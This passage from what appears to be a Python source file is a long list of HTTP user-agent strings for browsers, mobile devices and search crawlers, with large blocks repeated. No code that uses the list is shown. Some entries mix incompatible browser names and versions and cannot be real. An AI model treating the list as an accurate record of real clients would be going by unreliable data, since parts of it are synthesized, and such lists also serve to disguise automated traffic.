               'Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)',
               'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
               'Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)',
               'Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)',
               'Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10',
               'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0',
               'Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10',
               'Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)',
               'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)',
               'Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)',
               'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)',
               'Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16',
               'Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
               'Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)',
               'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51',
               'Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)',
               'Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7',
               'BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0',
               'Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)',
               'Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)',
               'Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)',
               'Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10',
               'Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)',
               'Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007',
               'BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179',
               'Mozilla/5.0 (compatible; 008/0.83; http://www.80legs.com/webcrawler.html) Gecko/2008032620',
               'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0) AddSugarSpiderBot www.idealobserver.com',
               'Mozilla/5.0 (compatible; AnyApexBot/1.0; +http://www.anyapex.com/bot.html)',
               'Mozilla/4.0 (compatible; Arachmo)', 'Mozilla/4.0 (compatible; B-l-i-t-z-B-O-T)',
               'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)',
               'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)',
               'Mozilla/5.0 (compatible; BecomeBot/2.3; MSIE 6.0 compatible; +http://www.become.com/site_owners.html)',
               'BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)',
               'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
               'Sqworm/2.9.85-BETA (beta_release; 20011115-775; i686-pc-linux-gnu)',
               'Mozilla/5.0 (compatible; YandexImages/3.0; +http://yandex.com/bots)',
               'Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)',
               'Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )',
               'Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )',
               'Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)',
               'Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.dlc@looksmart.net; http://www.WISEnutbot.com)',
               'Mozilla/4.0 compatible ZyBorg/1.0 (wn-16.zyborg@looksmart.net; http://www.WISEnutbot.com)',
               'Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)',
               'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser 1.98.744; .NET CLR 3.5.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; Acoo Browser; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; Avant Browser)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser; GTB6; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; InfoPath.1; .NET CLR 3.5.30729; .NET CLR 3.0.30618)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Acoo Browser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/419 (KHTML, like Gecko, Safari/419.3) Cheshire/1.0.ALPHA',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) ChromePlus/4.0.222.3 Chrome/4.0.222.3 Safari/532.2',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.215 Safari/534.10 ChromePlus/1.5.1.1',
               'Links (2.7; Linux 3.7.9-2-ARCH x86_64; GNU C 4.7.1; text)',
               'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A',
               'Mozilla/5.0 (PLAYSTATION 3; 3.55)', 'Mozilla/5.0 (PLAYSTATION 3; 2.00)',
               'Mozilla/5.0 (PLAYSTATION 3; 1.00)',
               'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:24.0) Gecko/20100101 Thunderbird/24.4.0',
               'Mozilla/5.0 (compatible; AbiLogicBot/1.0; +http://www.abilogic.com/bot.html)',
               'SiteBar/3.3.8 (Bookmark Server; http://sitebar.org/)',
               'iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)',
               'iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)',
               'Mozilla/4.0 (compatible; WebCapture 3.0; Macintosh)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (FM Scene 4.6.1)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (.NET CLR 3.5.30729) (Prevx 3.0.5) ',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.1.8) Gecko/20071004 Iceweasel/2.0.0.8 (Debian-2.0.0.6+2.0.0.8-Oetch1)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; {1C69E7AA-C14E-200E-5A77-8EAB2D667A07})',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; acc=baadshah; acc=none; freenet DSL 1.1; (none))',
               'Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 8.51',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; snprtz|S26320700000083|2600#Service Pack 1#2#5#154321|isdn)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Alexa Toolbar; mxie; .NET CLR 1.1.4322)',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; ja-jp) AppleWebKit/417.9 (KHTML, like Gecko) Safari/417.8',
               'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.12) Gecko/20051010 Firefox/1.0.7 (Ubuntu package 1.0.7)',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)',
               'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)',
               'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
               'Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57',
               'Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
               'Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0',
               'Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g',
               'Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125',
               'Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)',
               'Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)',
               'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
               'Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)',
               'Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)',
               'Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10',
               'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0',
               'Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10',
               'Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)',
               'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)',
               'Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)',
               'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)',
               'Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16',
               'Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
               'Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)',
               'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51',
               'Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)',
               'Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7',
               'BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0',
               'Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)',
               'Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)',
               'Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)',
               'Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10',
               'Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)',
               'Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007',
               'BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179',
               'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)',
               'Googlebot/2.1 (http://www.googlebot.com/bot.html)', 'Opera/9.20 (Windows NT 6.0; U; en)',
               'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)',
               'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)',
               'Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0',
               'Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16',
               'Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13',
               'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)',
               'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)',
               'Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)', 'Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7',
               'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
               'Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)',
               'YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)',
               'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)',
               'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51',
               'AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)',
               'Mozilla/5.0 (compatible; MSIE 9.0; AOL 9.7; AOLBuild 4343.19; Windows NT 6.1; WOW64; Trident/5.0; FunWebProducts)',
               'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.27; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.21; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)',
               'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; GTB7.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)',
               'Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
               'Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57',
               'Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
               'Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0',
               'Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g',
               'Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125',
               'Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)',
               'Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)',
               'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
               'Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)',
               'Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)',
               'Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10',
               'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0',
               'Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10',
               'Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)',
               'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)',
               'Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)',
               'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)',
               'Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16',
               'Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
               'Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)',
               'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51',
               'Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)',
               'Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7',
               'BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0',
               'Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)',
               'Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)',
               'Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)',
               'Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10',
               'Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)',
               'Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007',
               'BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
